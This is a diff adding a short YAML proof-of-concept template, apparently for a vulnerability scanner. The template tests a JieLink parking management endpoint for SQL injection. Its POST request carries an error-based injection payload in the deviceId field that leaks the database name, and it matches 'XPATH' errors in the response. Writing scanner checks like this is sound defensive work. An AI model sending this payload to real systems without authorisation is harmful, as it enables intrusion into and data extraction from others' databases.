@@ -1,0 +1,18 @@
+name: poc-yaml-poc-yaml-jielink-sql-injection
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /mobile/Remote/GetParkController
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: deviceId=1'and/**/extractvalue(1,concat(char(126),database()))and'
+    expression: >-
+      response.status == 200 && response.body_string.contains("XPATH") &&
+      response.body_string.contains("error")
+expression: r0()
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/138969610
